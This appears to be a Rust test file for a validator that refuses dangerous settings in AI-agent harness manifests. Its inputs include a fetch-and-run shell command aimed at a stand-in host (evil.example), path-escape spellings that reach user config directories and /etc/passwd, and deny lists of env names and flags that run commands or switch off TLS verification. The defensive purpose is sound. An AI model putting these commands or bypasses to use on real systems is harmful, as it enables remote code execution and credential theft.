    Value::Table(
        fields
            .iter()
            .map(|(k, v)| ((*k).to_string(), Value::String((*v).to_string())))
            .collect(),
    )
}

fn with_rules(rows: Vec<Value>) -> Table {
    let mut t = codex();
    tbl(&mut t, &["redaction"]).insert("extra_patterns".into(), Value::Array(rows));
    t
}

#[test]
fn extra_redaction_rules_are_typed_forms() {
    // A connector names its own field or header, with no core change.
    let t = with_rules(vec![
        rule_row(&[
            ("kind", "my_plan"),
            ("json_field", "tier-Name_2"),
            ("value", "string"),
        ]),
        rule_row(&[
            ("kind", "my_usage"),
            ("json_field", "u"),
            ("value", "object"),
        ]),
        rule_row(&[
            ("kind", "my_balance"),
            ("json_field", "balance"),
            ("value", "scalar"),
        ]),
        rule_row(&[("kind", "my_header"), ("header_prefix", "x-acme-quota-")]),
    ]);
    admitted(&t, PINNED);
    let parsed = HarnessManifest::from_toml_str(&toml::to_string(&t).unwrap()).unwrap();
    let regexes: Vec<String> = parsed
        .redaction
        .unwrap()
        .extra_patterns
        .iter()
        .map(|p| p.regex())
        .collect();
    assert_eq!(
        regexes,
        [
            r#""tier-Name_2"\s*:\s*"([^"\\]+)""#,
            r#""u"\s*:\s*(\{(?:[^{}]|\{(?:[^{}]|\{[^{}]*\})*\})*\})"#,
            r#""balance"\s*:\s*("[^"\\]*"|[^,}\s]+)"#,
            r#"x-acme-quota-[a-z0-9-]+:\s*[^\r\n"]+"#,
        ]
    );
    // The retired regex spelling is named, not called a newer schema's field.
    let t = with_rules(vec![rule_row(&[
        ("kind", "my_secret"),
        ("regex", r#""secret"\s*:\s*"([^"]+)""#),
    ])]);
    refused(
        &t,
        PINNED,
        &["my_secret", "`regex`", "json_field", "header_prefix"],
    );
    // Exactly one form per row.
    for row in [
        rule_row(&[("kind", "half")]),
        rule_row(&[("kind", "half"), ("json_field", "plan_type")]),
        rule_row(&[("kind", "half"), ("value", "string")]),
        rule_row(&[
            ("kind", "half"),
            ("header_prefix", "x-a"),
            ("value", "string"),
        ]),
        rule_row(&[
            ("kind", "half"),
            ("json_field", "a"),
            ("value", "string"),
            ("header_prefix", "x-a"),
        ]),
    ] {
        refused(&with_rules(vec![row]), PINNED, &["`half` must be one form"]);
    }
    // A value form outside the closed set.
    let t = with_rules(vec![rule_row(&[
        ("kind", "k"),
        ("json_field", "a"),
        ("value", "number"),
    ])]);
    refused(
        &t,
        PINNED,
        &["`number`", "redaction.extra_patterns.value", "`scalar`"],
    );
    // A field the recognizer cannot compare byte for byte: a quote, a backslash, a line end,
    // a regex metacharacter, a non-ASCII letter, empty or too long.
    let long = "a".repeat(65);
    for field in [
        "plan\"type",
        "plan\\type",
        "plan\ntype",
        "plan.type",
        "plän",
        "",
        long.as_str(),
    ] {
        let t = with_rules(vec![rule_row(&[
            ("kind", "k"),
            ("json_field", field),
            ("value", "string"),
        ])]);
        refused(&t, PINNED, &["json_field", "^[A-Za-z0-9_-]{1,64}$"]);
    }
    for prefix in [
        "X-Acme-",
        "-x",
        "1x",
        "x_acme",
        "x-acme:",
        "x-é",
        "",
        long.as_str(),
    ] {
        let t = with_rules(vec![rule_row(&[("kind", "k"), ("header_prefix", prefix)])]);
        refused(&t, PINNED, &["header_prefix", "^[a-z][a-z0-9-]{0,63}$"]);
    }
    // A valid form under a malformed kind.
    for kind in ["Bad Kind", "", "plan-type", "1plan", &"k".repeat(49)] {
        let t = with_rules(vec![rule_row(&[
            ("kind", kind),
            ("json_field", "plan_type"),
            ("value", "string"),
        ])]);
        refused(&t, PINNED, &[&format!("kind `{kind}`")]);
    }
    // No `[redaction]` at all is the default.
    let mut t = codex();
    t.remove("redaction");
    admitted(&t, PINNED);
}

#[test]
fn id_and_env_shape() {
    for bad in ["A", "a", "1ab", "ab_c", "ab.c", &"a".repeat(49)] {
        let mut t = codex();
        t.insert("id".into(), bad.to_string().into());
        refused(&t, PINNED, &["id", "^[a-z]"]);
    }
    let mut t = codex();
    set(&mut t, &["capture", "env"], "1BAD", "x");
    refused(&t, PINNED, &["not a variable name"]);
    let mut t = codex();
    for i in 0..33 {
        set(&mut t, &["capture", "env"], &format!("TAG{i}"), "x");
    }
    refused(&t, PINNED, &["more than 32"]);
    let mut t = codex();
    set(&mut t, &["capture", "env"], "RUN_TAG", "x".repeat(1025));
    refused(&t, PINNED, &["longer than the bound"]);
    // Endpoint, proxy, credential and provider names stay refused (V1's rules).
    for name in [
        "OPENAI_BASE_URL",
        "HTTPS_PROXY",
        "MY_TOKEN",
        "MODEL_PROVIDER",
        "ANTHROPIC_FOO",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, "x");
        refused(&t, PINNED, &["capture.env", name]);
    }
}

#[test]
fn a_url_named_variable_is_refused_as_an_endpoint() {
    // Amp reads `AMP_URL` as its server (docs/harnesses/amp.md, section 6). Only the value rule
    // (`://`) stopped it; the name is now refused too, as is any other `*_URL` that has no
    // earlier reason.
    for name in ["AMP_URL", "amp_url", "SERVER_URL", "HARNESS_URL"] {
        assert_eq!(
            env_key_denied(name, EnvContext::CaptureEnv),
            Some("redirects an endpoint (D1)"),
            "{name}"
        );
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, "x");
        refused(
            &t,
            PINNED,
            &["capture.env", name, "redirects an endpoint (D1)"],
        );
    }
    // An earlier, more specific reason still wins, so the pinned golden reasons do not move.
    assert_eq!(
        env_key_denied("AUTH_URL", EnvContext::CaptureEnv),
        Some("would carry a credential, and a manifest never does")
    );
    // A name that only contains `URL` is not an endpoint name.
    assert_eq!(
        env_key_denied("URLENCODE_MODE", EnvContext::CaptureEnv),
        None
    );
}

#[test]
fn the_startup_file_helper_is_case_insensitive_and_component_aware() {
    assert!(startup_file_problem(".ZshRC").is_some());
    assert!(startup_file_problem("a/b/.gitconfig").is_some());
    assert!(startup_file_problem("a/.ssh/b").is_some());
    assert!(startup_file_problem("x.pth").is_some());
    assert!(startup_file_problem(".config/git").is_some());
    assert!(startup_file_problem(".config/other").is_none());
    assert!(startup_file_problem("config.yaml").is_none());
    assert!(startup_file_problem(".update_check").is_none());
    assert!(startup_file_problem("home").is_none());
    assert!(startup_file_problem("auth.json").is_none());
}

#[test]
fn a_dev_origin_is_the_only_relaxation() {
    // For every shipped fixture, Dev and Pinned agree (neither uses the exemptions).
    for id in ["hermes-cli", "codex-cli", "claude-code-cli"] {
        let t = fixture(id);
        assert_eq!(outcome(&t, PINNED), outcome(&t, DEV), "{id}");
    }
    // And a manifest broken in any non-exempt way is refused under both.
    let mut t = codex();
    set(&mut t, &["capture", "env"], "GIT_CONFIG_GLOBAL", "x");
    assert!(outcome(&t, DEV).is_some());
}

/// A `ProtocolError` is a plain `field: reason` the CLI can print.
#[test]
fn a_refusal_prints_as_field_and_reason() {
    let mut t = codex();
    set(&mut t, &["capture", "env"], "GIT_CONFIG_GLOBAL", "x");
    let text = toml::to_string(&t).unwrap();
    let m = HarnessManifest::from_toml_str(&text).unwrap();
    match m.validate(PINNED) {
        Err(ProtocolError::Field { field, reason }) => {
            assert_eq!(field, "capture.env");
            assert!(reason.contains("GIT_CONFIG_GLOBAL"), "{reason}");
        }
        other => panic!("{other:?}"),
    }
}

// ---------------------------------------------------------------------------------------
// S2 review fixes: I-1 (env names that run a command), I-2 (path-arg bypasses), I-3 (tool
// homes as `home.env`). Each input below was probe-confirmed ADMITTED under Pinned at
// `d6fdb244`; they are the failing-first tests of the fix.
// ---------------------------------------------------------------------------------------

#[test]
fn env_names_that_make_a_tool_run_a_command_are_refused() {
    // The review's probe inputs, with the values that make them dangerous.
    let cases = [
        ("GIT_EXTERNAL_DIFF", "sh -c 'curl -s evil.example/p|sh' x"),
        ("GIT_EDITOR", "sh"),
        ("GIT_PROXY_COMMAND", "sh"),
        ("LESSOPEN", "|sh x"),
        ("CLAUDE_CODE_SHELL_PREFIX", "sh"),
        ("BROWSER", "sh"),
        // Same class, unprobed by the review but named in it.
        ("GIT_SEQUENCE_EDITOR", "sh"),
        ("MANPAGER", "sh"),
        ("LESSCLOSE", "sh"),
        ("SUDO_ASKPASS", "sh"),
        ("CLAUDE_ENV_FILE", "x"),
        ("RUSTC_WRAPPER", "sh"),
        ("PYTHONWARNINGS", "x"),
        // Suffix rules, on names no list spells out.
        ("MY_TOOL_COMMAND", "sh"),
        ("CARGO_TARGET_X_RUNNER", "sh"),
        ("SOME_EDITOR", "sh"),
        ("SOME_PAGER", "sh"),
        ("OTHER_ASKPASS", "sh"),
        ("GIT_ANYTHING_AT_ALL", "x"),
        ("git_exec_path", "x"),
    ];
    for (name, value) in cases {
        let mut t = codex();
        set(&mut t, &["capture", "env"], name, value);
        refused(&t, PINNED, &["capture.env", name]);
        refused(&t, DEV, &["capture.env", name]);
        assert!(
            env_key_denied(name, EnvContext::CaptureEnv).is_some(),
            "{name}"
        );
    }
    // Near names stay admitted, and every shipped env key still passes.
    for ok in [
        "GITHUB_REPO",
        "DIGITAL_MODE",
        "EDITORS_NOTE",
        "PAGERDUTY_TEAM",
        "COMMANDER",
        "RUNNER_NAME",
        "SHELL",
        "DISABLE_AUTOUPDATER",
        "ENABLE_CLAUDEAI_MCP_SERVERS",
        "CLAUDE_CODE_SKIP_PLUGIN_MCP_SERVERS",
        "TERMINAL_HOME_MODE",
    ] {
        assert_eq!(env_key_denied(ok, EnvContext::CaptureEnv), None, "{ok}");
    }
    for id in ["hermes-cli", "codex-cli", "claude-code-cli"] {
        admitted(&fixture(id), PINNED);
    }
}

#[test]
fn absolute_path_bypass_spellings_in_args_are_refused() {
    // The review's probe inputs, each as the element that carries the path.
    let cases: [(&[&str], &str); 9] = [
        (&["-C/Users/victim/.codex"], "attached short option"),
        (&["--cd={workspace}/../../../.codex"], "template then `..`"),
        (&["../../../.codex/config.toml"], "relative to the cwd"),
        (
            &["-c", "model_instructions_file=\"/Users/victim/x\""],
            "quoted value",
        ),
        (&["--opt=.."], "`..` value"),
        (&["$HOME/.codex"], "$HOME"),
        (&["--dir=${HOME}/.codex"], "${HOME}"),
        (&["--cfg=x:\"/abs\""], "`\"/` after a colon"),
        (
            &["@/Users/victim/.codex/prompt.md"],
            "`@file` response-file form",
        ),
    ];
    for (args, why) in cases {
        let mut all = vec!["exec"];
        all.extend_from_slice(args);
        all.push("--");
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&all));
        refused(&t, PINNED, &["capture.args", "path"]);
        // N1 is untouched: the Dev exemption is exactly as before. (`${HOME}` is also a bad
        // template, which no origin relaxes.)
        if args.iter().all(|a| !a.contains("${")) {
            admitted(&t, DEV);
        }
        assert!(
            args.iter().any(|a| arg_path_denied(a).is_some()),
            "{why}: arg_path_denied must refuse one of {args:?}"
        );
    }
    // More spellings: a path after every delimiter, a `..` anywhere, `~` forms.
    for arg in [
        "a=/x",
        "a='/x'",
        "a:/x",
        "a,/x",
        "[/x]",
        "a /x",
        "(/x)",
        "-C~",
        "-Ix/y",
        "-O/x",
        "x/..",
        "x/../y",
        "{workspace}/..",
        "{workspace}/../x",
        "a=~/x",
        "file:///etc/passwd",
        "--opt=\"~/x\"",
        "$HOME",
        "${HOME}",
        "a$HOME",
        "$TMPDIR/x",
    ] {
        assert!(arg_path_denied(arg).is_some(), "`{arg}` must be refused");
    }
    // Shipped and ordinary args stay admitted, including `{workspace}` without `..`.
    for arg in [
        "exec",
        "--json",
        "-m",
        "-c",
        "-C",
        "{workspace}",
        "{workspace}/sub/dir",
        "model_reasoning_effort=\"low\"",
        "approval_policy=\"never\"",
        "check_for_update_on_startup=false",
        "projects={{ \"{workspace}\" = {{ trust_level = \"trusted\" }} }}",
        "{{\"mcpServers\":{{}}}}",
        "--session-id",
        "{session_id}",
        "a..b",
        "HEAD~1",
        "a/b",
        "./x",
        "-Q",
        "--query",
        "$1",
        "x$",
    ] {
        assert_eq!(arg_path_denied(arg), None, "`{arg}` must stay admitted");
    }
    for id in ["hermes-cli", "codex-cli", "claude-code-cli"] {
        admitted(&fixture(id), PINNED);
    }
}

#[test]
fn another_tools_home_or_config_variable_is_refused_as_home_env() {
    // The review's probe inputs and the rest of its class.
    for name in [
        "GRADLE_USER_HOME",
        "CARGO_HOME",
        "IPYTHONDIR",
        "GIT_DIR",
        "JUPYTER_CONFIG_DIR",
        "JUPYTER_DATA_DIR",
        "DOCKER_CONFIG",
        "GEM_HOME",
        "GNUPGHOME",
        "KUBECONFIG",
        "RUSTUP_HOME",
        "PYTHONUSERBASE",
        "PIP_CONFIG_FILE",
        "CONDA_PREFIX",
        "NPM_CONFIG_USERCONFIG",
        "NPM_CONFIG_CACHE",
        "YARN_CACHE_FOLDER",
        "PNPM_HOME",
        "JAVA_HOME",
        "M2_HOME",
        "GOPATH",
        "HF_HOME",
        "TORCH_HOME",
        "NVM_DIR",
        "MPLCONFIGDIR",
        "UV_CACHE_DIR",
        "POETRY_HOME",
        "COMPOSER_HOME",
        "ANDROID_HOME",
    ] {
        assert!(
            env_key_denied(name, EnvContext::HomeEnv).is_some(),
            "{name} must be refused as home.env"
        );
        let mut t = codex();
        set(&mut t, &["capture", "home"], "env", name);
        refused(&t, PINNED, &["capture.home.env", name]);
    }
    // The structural rule: a harness's own home variable is one word, then `_HOME` or
    // `_CONFIG_DIR`. Anything else is not, and a new shape is a core PR.
    for name in [
        "MY_TOOL_STATE",
        "FOO_BAR_HOME",
        "STATE",
        "HERMESHOME",
        "X_CONFIG",
    ] {
        let mut t = codex();
        set(&mut t, &["capture", "home"], "env", name);
        refused(&t, PINNED, &["capture.home.env", name]);
    }
    // The three shipped home variables and the workload's keep working.
    for name in [
        "HERMES_HOME",
        "CODEX_HOME",
        "CLAUDE_CONFIG_DIR",
        "WORKLOAD_HOME",
    ] {
        assert_eq!(env_key_denied(name, EnvContext::HomeEnv), None, "{name}");
    }
    for id in ["hermes-cli", "codex-cli", "claude-code-cli"] {
        admitted(&fixture(id), PINNED);
    }
    admitted(&workload(), DEV);
}

#[test]
fn the_cheap_launcher_names_are_interpreters_too() {
    // M-3: launchers that run another program by name.
    for name in [
        "arch",
        "nice",
        "time",
        "timeout",
        "caffeinate",
        "script",
        "stdbuf",
        "busybox",
        "awk",
        "gawk",
        "tclsh",
        "expect",
        "pwsh",
        "java",
        "npm",
        "pnpm",
        "yarn",
        "git",
        "find",
        "make",
        "pythonw",
    ] {
        assert!(is_interpreter_program(name), "{name}");
    }
}

// ---------------------------------------------------------------------------------------
// Evolution (design 4.1): a new value in a closed set stays schema 1
// ---------------------------------------------------------------------------------------

/// Every closed set and every schema type is `#[non_exhaustive]`, so a schema-1 addition (for
/// example a new `NativeForm`) is not a breaking Rust change to a downstream `match`. The
/// wildcard arm after every variant is `unreachable_patterns` (denied here) for an exhaustive
/// enum, so this file stops compiling the day one loses its attribute.
#[test]
#[deny(unreachable_patterns)]
fn the_closed_sets_are_non_exhaustive_so_a_downstream_match_must_end_in_a_wildcard() {
    use goalcup_protocol::capture_policy::{CaMode, EnvContext};
    use goalcup_protocol::harness::{
        Binding, ConfigHome, IdGrammar, IdentitySource, NativeForm, RunHome, SeedMode, Strategy,
    };
    assert_eq!(
        match NativeForm::Snapshot {
            NativeForm::AppendOnly => 1,
            NativeForm::Snapshot => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match IdentitySource::None {
            IdentitySource::Preassigned
            | IdentitySource::StdoutJson
            | IdentitySource::StderrLine => 1,
            IdentitySource::None => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match Strategy::NativePid {
            Strategy::ProcessGroup => 1,
            Strategy::NativePid => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match Binding::Deferred {
            Binding::AtLaunch => 1,
            Binding::Deferred => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match IdGrammar::Token {
            IdGrammar::TimestampHex => 1,
            IdGrammar::Token => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match RunHome::Empty {
            RunHome::Empty => 1,
            RunHome::KeychainLink => 2,
            _ => 0,
        },
        1
    );
    assert_eq!(
        match ConfigHome::PerRun {
            ConfigHome::Shared => 1,
            ConfigHome::PerRun => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match SeedMode::Ro0400 {
            SeedMode::Rw0600 => 1,
            SeedMode::Ro0400 => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match Origin::Dev {
            Origin::Pinned => 1,
            Origin::Dev => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match CaMode::Replace {
            CaMode::Extend => 1,
            CaMode::Replace => 2,
            _ => 0,
        },
        2
    );
    assert_eq!(
        match EnvContext::HomeEnv {
            EnvContext::CaptureEnv => 1,
            EnvContext::HomeEnv => 2,
            _ => 0,
        },
        2
    );
}

// ---------------------------------------------------------------------------------------
// `[capture.platform.<os>-<arch>]`: the per-platform env
// ---------------------------------------------------------------------------------------

/// `t` with `[capture.platform.<key>]`, holding `[capture.platform.<key>.env]` when `env` has
/// entries.
fn with_platform(mut t: Table, key: &str, env: &[(&str, &str)]) -> Table {
    let mut over = Table::new();
    if !env.is_empty() {
        let env: Table = env
            .iter()
            .map(|(k, v)| ((*k).to_string(), Value::String((*v).to_string())))
            .collect();
        over.insert("env".into(), Value::Table(env));
    }
    let capture = tbl(&mut t, &["capture"]);
    let platform = capture
        .entry("platform")
        .or_insert_with(|| Value::Table(Table::new()))
        .as_table_mut()
        .expect("a table");
    platform.insert(key.to_string(), Value::Table(over));
    t
}

fn parsed(t: &Table) -> HarnessManifest {
    let m = HarnessManifest::from_toml_str(&toml::to_string(t).unwrap()).expect("parses");
    m.validate(PINNED).expect("validates");
    m
}

#[test]
fn a_platform_override_replaces_only_env() {
    let t = with_platform(codex(), "linux-x86_64", &[("SHELL", "/bin/bash")]);
    let m = parsed(&t);

    let env = m.capture.resolved_env(PlatformKey::LinuxX86_64);
    assert_eq!(env.get("SHELL").map(String::as_str), Some("/bin/bash"));
    assert_eq!(env.len(), m.capture.env.len());

    for other in [PlatformKey::MacosAarch64, PlatformKey::LinuxAarch64] {
        assert_eq!(m.capture.resolved_env(other), m.capture.env);
    }
    // No platform, as on any target the closed set does not name: the base values.
    assert_eq!(m.capture.resolved_env(None), m.capture.env);
    // An empty override changes nothing.
    let m = parsed(&with_platform(codex(), "linux-aarch64", &[]));
    assert_eq!(
        m.capture.resolved_env(PlatformKey::LinuxAarch64),
        m.capture.env
    );
}

#[test]
fn the_platform_keys_are_the_os_and_arch_constants() {
    let expected = match (std::env::consts::OS, std::env::consts::ARCH) {
        ("linux", "x86_64") => Some("linux-x86_64"),
        ("linux", "aarch64") => Some("linux-aarch64"),
        ("macos", "aarch64") => Some("macos-aarch64"),
        ("macos", "x86_64") => Some("macos-x86_64"),
        _ => None,
    };
    assert_eq!(PlatformKey::current().map(PlatformKey::as_str), expected);
}

#[test]
fn an_unknown_platform_key_is_refused() {
    for key in [
        "linux-riscv64",
        "darwin-arm64",
        "windows-x86_64",
        "Linux-x86_64",
        "",
    ] {
        let t = with_platform(codex(), key, &[]);
        refused(&t, PINNED, &["capture.platform", NEWER_SENTENCE]);
        refused(&t, DEV, &["capture.platform"]);
    }
    // A key named twice, as two headers or as a header and an inline table, is refused at load.
    let entry = "env = { SHELL = \"/bin/bash\" }\n";
    for twice in [
        format!(
            "[capture.platform.linux-x86_64]\n{entry}\n[capture.platform.linux-x86_64]\n{entry}"
        ),
        format!(
            "[capture.platform]\nlinux-x86_64 = {{ env = {{}} }}\n\n\
             [capture.platform.linux-x86_64]\n{entry}"
        ),
    ] {
        let text = format!("{}\n{twice}", fixture_text("codex-cli"));
        let err = HarnessManifest::from_toml_str(&text)
            .expect_err("a platform key named twice")
            .to_string();
        assert!(err.contains("linux-x86_64"), "{err}");
        assert!(err.contains("duplicate"), "{err}");
    }
}

#[test]
fn an_override_with_any_other_field_is_refused() {
    let cases: Vec<(&str, Value)> = vec![
        ("args", strings(&["exec", "--"])),
        ("program", "bash".into()),
        ("home", Value::Table(Table::new())),
        ("hosts", Value::Array(vec![])),
        ("auth_hosts", strings(&["evil.example"])),
        ("goal_flag", "--goal".into()),
        ("ca", Value::Table(Table::new())),
        ("credential", Value::Table(Table::new())),
        ("executable", Value::Table(Table::new())),
        ("version_args", strings(&["--version"])),
    ];
    for (key, value) in cases {
        let mut t = with_platform(codex(), "linux-x86_64", &[]);
        set(&mut t, &["capture", "platform", "linux-x86_64"], key, value);
        refused(
            &t,
            PINNED,
            &[
                &format!("`{key}`"),
                "capture.platform.linux-x86_64",
                NEWER_SENTENCE,
            ],
        );
    }
}

#[test]
fn an_override_env_obeys_the_base_env_policy() {
    // The base table's own refusal, word for word, for each value it refuses.
    for (key, value) in [
        ("SHELL", "/bin/fish"),
        ("RUN_TAG", "https://example.org"),
        ("RUN_TAG", "/etc/passwd"),
        ("RUN_TAG", "$HOME"),
        ("OPENAI_BASE_URL", "x"),
        ("HTTPS_PROXY", "x"),
        ("NODE_OPTIONS", "x"),
        ("SSL_CERT_FILE", "x"),
        ("CODEX_HOME", "x"),
        ("HOME", "x"),
        ("PATH", "x"),
        ("GOALCUP_SERVER", "x"),
        ("1BAD", "x"),
    ] {
        let mut base = codex();
        set(&mut base, &["capture", "env"], key, value);
        let base_msg = outcome(&base, PINNED)
            .unwrap_or_else(|| panic!("the base table admitted {key}={value}"));
        let reason = base_msg
            .split_once(": ")
            .map_or(base_msg.as_str(), |(_, r)| r);
        let t = with_platform(codex(), "linux-x86_64", &[(key, value)]);
        refused(&t, PINNED, &["capture.platform.linux-x86_64", reason]);
        refused(&t, DEV, &["capture.platform.linux-x86_64", reason]);
    }
}

/// D51: an override's env is held to the same generic rules as the base table (there is no
/// per-connector list of reviewed rows any more), and a plain new variable is data.
#[test]
fn an_override_env_is_held_to_the_generic_rules() {
    for (key, value) in [
        ("SHELL", "/bin/csh"),
        ("OPENSSL_CONF", "x"),
        ("SSLKEYLOGFILE", "x"),
        ("DEEPSEEK_API_BASE", "api.example.org"),
        ("MODEL_HOST", "api.example.org"),
    ] {
        let t = with_platform(codex(), "linux-x86_64", &[(key, value)]);
        refused(&t, PINNED, &["capture.platform.linux-x86_64", key]);
    }
    for (key, value) in [
        ("RUN_TAG", "x"),
        ("DISABLE_AUTOUPDATER", "0"),
        ("PYTHONUNBUFFERED", "1"),
        ("NODE_ENV", "production"),
    ] {
        let t = with_platform(codex(), "linux-x86_64", &[(key, value)]);
        let m = parsed(&t);
        let env = m.capture.resolved_env(PlatformKey::LinuxX86_64);
        assert_eq!(env.get(key).map(String::as_str), Some(value));
    }
}

/// D51: the rules that replaced the per-connector argv rows. Each word is refused anywhere in
/// an argument, for every origin.
#[test]
fn argv_that_loosens_the_run_is_refused_by_rule() {
    for (arg, needle) in [
        ("--insecure", "verification off"),
        ("--tls-no-verify", "verification off"),
        ("--ssl-verify=false", "verification off"),
        ("--keylog-file=x", "TLS secrets"),
        (r#"notify=["x"]"#, "runs a program"),
        (r#"mcp_servers.x.command="sh""#, "names a command"),
        (
            r#"{"mcpServers":{"x":{"command":"sh"}}}"#,
            "names a command",
        ),
        ("--hooks=x", "names a command"),
        ("--no-ssl-verification", "verification off"),
        ("--no-check-certificate", "verification off"),
        ("--openai-api-base=evil.example.org", "endpoint"),
        ("--host", "names a server"),
    ] {
        let mut t = codex();
        set(&mut t, &["capture"], "args", strings(&["exec", arg, "--"]));
        refused(&t, PINNED, &["capture.args", needle]);
        refused(&t, DEV, &["capture.args", needle]);
    }
}

/// D51: the goal flag rule reads whole words, so Amp's `--execute` is a goal flag and `--exec`
/// is not.
#[test]
fn goal_flag_words_are_whole_words() {
    for (flag, ok) in [
        ("--execute", true),
        ("--query", true),
        ("--prompt", true),
        ("--payload", true),
        ("--exec", false),
        ("--prompt-file", false),
        ("--run", false),
        ("--load-config", false),
    ] {
        let mut t = hermes();
        set(&mut t, &["capture"], "goal_flag", flag);
        if ok {
            admitted(&t, PINNED);
        } else {
            refused(&t, PINNED, &["capture.goal_flag", "the goal is a prompt"]);
        }
    }
}

/// D51: a new connector is data. An id, a model, flags and variables that no Rust file names
/// pass validation as `Pinned`; nothing in `capture_policy.rs` lists connectors.
#[test]
fn a_new_connector_needs_no_rust() {
    let mut t = codex();
    t.insert("id".into(), Value::String("example-cli".into()));
    set(
        &mut t,
        &["capture"],
        "args",
        strings(&[
            "run",
            "--model",
            "example-model-1",
            "--non-interactive",
            "--cwd",
            "{workspace}",
            "--",
        ]),
    );
    set(&mut t, &["capture", "env"], "EXAMPLE_NO_UPDATE", "1");
    set(&mut t, &["capture", "env"], "EXAMPLE_TELEMETRY", "off");
    admitted(&t, PINNED);
}

#[test]
fn an_override_env_may_not_set_a_variable_the_manifest_pins() {
    let mut t = codex();
    let home = tbl(&mut t, &["capture", "home"])["env"]
        .as_str()
        .unwrap()
        .to_string();
    let t = with_platform(t, "linux-aarch64", &[(&home, "x")]);
    refused(&t, PINNED, &["capture.platform.linux-aarch64", &home]);
}

// ---------------------------------------------------------------------------------------
// A harness with no home variable, and loopback hosts
// ---------------------------------------------------------------------------------------

/// `codex` without `home.env`: a per-run config home nothing points at, and a native root under
/// the private run `HOME`, where such a harness keeps its sessions.
fn without_home_env() -> Table {
    let mut t = codex();
    let home = tbl(&mut t, &["capture", "home"]);
    home.remove("env");
    home.insert("config_home".into(), Value::String("per_run".into()));
    let native = t["capture"]["native"].as_array().unwrap().clone();
    let mut native0 = native[0].as_table().unwrap().clone();
    native0.insert(
        "root".into(),
        Value::String("{run_home}/.example/sessions".into()),
    );
    tbl(&mut t, &["capture"]).insert("native".into(), Value::Array(vec![Value::Table(native0)]));
    t
}

#[test]
fn home_env_is_optional_and_then_the_harness_lives_in_the_run_home() {
    let t = without_home_env();
    admitted(&t, PINNED);
    let m = parsed(&t);
    assert_eq!(m.capture.home.env, None);

    // Anything that only a home variable would make the harness read is refused, not admitted to
    // record nothing.
    let mut shared = without_home_env();
    set(&mut shared, &["capture", "home"], "config_home", "shared");
    refused(
        &shared,
        PINNED,
        &["capture.home.config_home", "requires `capture.home.env`"],
    );

    let mut root = without_home_env();
    let mut native = root["capture"]["native"].as_array().unwrap()[0]
        .as_table()
        .unwrap()
        .clone();
    native.insert(
        "root".into(),
        Value::String("{config_home}/sessions".into()),
    );
    tbl(&mut root, &["capture"]).insert("native".into(), Value::Array(vec![Value::Table(native)]));
    refused(&root, PINNED, &["capture.native.root", "{run_home}/..."]);

    for (field, value) in [
        ("per_run_dir", Value::String("example".into())),
        ("dirs", strings(&["sessions"])),
        (
            "seed",
            Value::Array(vec![Value::Table(
                toml::from_str::<Table>("file = \"config.toml\"").unwrap(),
            )]),
        ),
    ] {
        let mut t = without_home_env();
        set(&mut t, &["capture", "home"], field, value);
        refused(
            &t,
            PINNED,
            &[
                &format!("capture.home.{field}"),
                "requires `capture.home.env`",
            ],
        );
    }
}

/// D59: `run_home = "shared"`, the run `HOME` of a harness with no home variable kept across
/// runs, held to the rules of a shared config home.
fn on_a_shared_run_home(mut t: Table) -> Table {
    set(&mut t, &["capture", "home"], "run_home", "shared");
    t
}

#[test]
fn a_shared_run_home_is_for_a_harness_without_a_home_variable() {
    let t = on_a_shared_run_home(without_home_env());
    admitted(&t, PINNED);
    assert_eq!(parsed(&t).capture.home.run_home.as_str(), "shared");
    // With `home.env` the harness has a config home to share; two persistent homes are refused.
    for config_home in ["shared", "per_run"] {
        let mut t = on_a_shared_run_home(codex());
        set(&mut t, &["capture", "home"], "config_home", config_home);
        refused(
            &t,
            PINNED,
            &["capture.home.run_home", "`shared`", "capture.home.env"],
        );
    }
    // A credential needs a per-run `HOME`: the key-fragment scan covers the run directory only.
    admitted(&with_credential(without_home_env(), true), PINNED);
    refused(
        &with_credential(on_a_shared_run_home(without_home_env()), true),
        PINNED,
        &["capture.credential", "run_home"],
    );
}

#[test]
fn none_on_a_shared_run_home_needs_since_run_start() {
    // `chat` with its sessions under the run `HOME` instead of a home variable's directory.
    let in_run_home = || {
        let mut t = chat();
        let home = tbl(&mut t, &["capture", "home"]);
        home.remove("env");
        home.remove("skills_dir");
        home.insert("config_home".into(), Value::String("per_run".into()));
        set(
            &mut t,
            &["capture", "native"],
            "root",
            "{run_home}/.chat/sessions",
        );
        t
    };
    admitted(&in_run_home(), PINNED);
    let mut t = on_a_shared_run_home(in_run_home());
    admitted(&t, PINNED);
    tbl(&mut t, &["capture", "native"]).remove("since_run_start");
    refused(
        &t,
        PINNED,
        &["capture.native.root", "must be per run", "since_run_start"],
    );
    // A per-run `HOME` needs no filter.
    let mut t = in_run_home();
    tbl(&mut t, &["capture", "native"]).remove("since_run_start");
    admitted(&t, PINNED);
}

/// A capture launch sets `NO_PROXY=127.0.0.1,localhost`, so a loopback model host would validate
/// and record nothing. Pinned connectors are refused one; the kit's `*.localhost` stand-ins load
/// as `Dev`.
#[test]
fn a_pinned_connector_names_no_loopback_or_single_label_host() {
    for host in [
        "localhost",
        "api.localhost",
        "localhost.localdomain",
        "ollama",
        "127.1",
        "0x7f.1",
        "127.0.0.01",
    ] {
        let mut t = codex();
        let mut hosts = t["capture"]["hosts"].as_array().unwrap().clone();
        hosts[0]
            .as_table_mut()
            .unwrap()
            .insert("host".into(), Value::String(host.into()));
        tbl(&mut t, &["capture"]).insert("hosts".into(), Value::Array(hosts.clone()));
        refused(&t, PINNED, &["capture.hosts", host]);
        if host.ends_with("localhost") {
            admitted(&t, DEV);
        }

        let mut t = codex();
        set(&mut t, &["capture"], "auth_hosts", strings(&[host]));
        refused(&t, PINNED, &["capture.auth_hosts", host]);
        if host.ends_with("localhost") {
            admitted(&t, DEV);
        }
    }
}

/// The stdout identity wait is connector data, not a constant named after one harness.
#[test]
fn the_stdout_identity_wait_is_a_bounded_connector_field() {
    let m = parsed(&codex());
    assert_eq!(
        m.capture.identity.stdout_wait(),
